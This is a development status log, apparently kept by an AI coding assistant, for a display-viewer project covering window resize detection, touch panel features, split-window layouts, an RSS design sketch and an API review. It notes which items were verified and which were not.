- (2026-10-13, from the user) Window resize detection: DONE. A viewer window that is moved or resized (by anyone: the
  manager, a window manager, a mode change) reports it like a screen being plugged (debounced 100 ms) and the layout
  is pushed to the web UI as Viewers/list. Verified on the VM by resizing a window from X: the push carried 1000x700.
- Touch panels (2026-10-13/14, from the user): ALL DONE and merged into dev: touch-to-screen mapping, screensaver over a home
  page, scheduled refresh, per-asset zoom + pinch switch, on-screen keyboard (see CLAUDE.md, "Touch panels"). Verified on the VM
  with synthetic input (uinput touchscreen, DevTools mouse/touch events): the screensaver suite passes 28/28 on the merged build,
  zoom viewports and pinch blocking, keyboard, mapping with rotation. NOT verified: a physical touch screen, remote (client)
  viewers, multi-output offsets, video/audio/PDF/image assets inside the screensaver overlay, the new Vue controls clicked
  through in a browser, apply-at-boot ordering after a full VM boot. Open questions: should "Automatic" map a single-output node
  by itself; should refresh also apply to the home page of an interactive window; should a window with a home page but no
  playlist show the "no assets" page instead of nothing; DECIDED with the user: Viewers/* permissions split one by one (see CLAUDE.md, Touch panels); the X
  restart does not reconnect the touch listener on a node without the viewer; Viewers page setKeyboard merges from possibly
  stale local state; no "reload home page" button.

- (2026-10-25, from the user) NOT STARTED, design questions open (see the conversation):
  * (DONE 2026-10-25 on branch `layout-panes`, see the first entry) Split windows: a viewer window divides into sub-windows like Konsole's split view (horizontal/vertical, recursive, draggable
    splitter, close a pane, each pane with its own playlist). Layout = a tree kept per window in window_layouts.json (not viewer_settings.json), drawn by boot-screen.html.
  * RSS: a fetcher with several sources, update time per source, all merged in ONE list; display = a text template (time + headline + colours);
    how many items: a count, a date ("today only") or a time range ("last 2 hours/2 days"); options: one or two lines, text colour and size,
    background, overlay on the viewer or taking space below it.

=== API REVIEW (2026-10-11) ===
DONE: API follows the user's naming convention (snake_case, one function per job, reads named after the state,
mutations broadcast under the getter's target, network under Settings/Network, default duration under Scheduler).
Cron add_job requires a full schedule (a missing field used to become '* * * * *', a reboot loop).
Also fixed: Power.test_method removed; Audio answers available=false instead of raising when there is no PulseAudio;
the menu and routes are permission-aware (driven by the permissions in /api/schema; pages are not mounted until the
user is known and allowed); /backup now needs admin; /uploaded needs a session unless the request comes from
loopback (the local viewer); the scheduler page has real playlist tabs, a new-playlist dialog and per-playlist
delete/settings, and every scheduler call carries playlist_id.
NOT VERIFIED: interactions in a real browser (only page loads via tools/ui-smoke.py); the playlist tabs with two
playlists and drag-and-drop reorder have never been exercised.

